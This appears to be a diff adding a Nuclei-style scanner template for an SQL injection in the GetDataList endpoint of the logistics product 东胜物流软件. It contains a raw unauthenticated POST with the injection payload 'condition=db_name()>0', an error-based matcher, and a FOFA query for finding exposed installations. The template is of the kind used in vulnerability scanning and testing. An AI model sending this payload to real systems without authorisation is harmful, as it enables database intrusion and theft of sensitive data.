@@ -1,0 +1,25 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==500 && contains_all(body,"nvarchar","数据类型","int")
+          name: SQL注入
+          type: dsl
+      raw:
+        - |
+          POST /Account/Chfee_hexiao/GetDataList HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          start=0&condition=db_name()>0&limit=10
+id: DongShengWuLiu-GetDataList-SQL
+info:
+    author: HuanXiong
+    description: |-
+        fofa: app="东胜物流软件-物流软件"
+        东胜物流软件 GetDataList 接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+    name: 东胜物流软件 GetDataList SQL注入
+    reference:
+        - null
+    severity: high
+    tags:
+        - 东胜物流软件
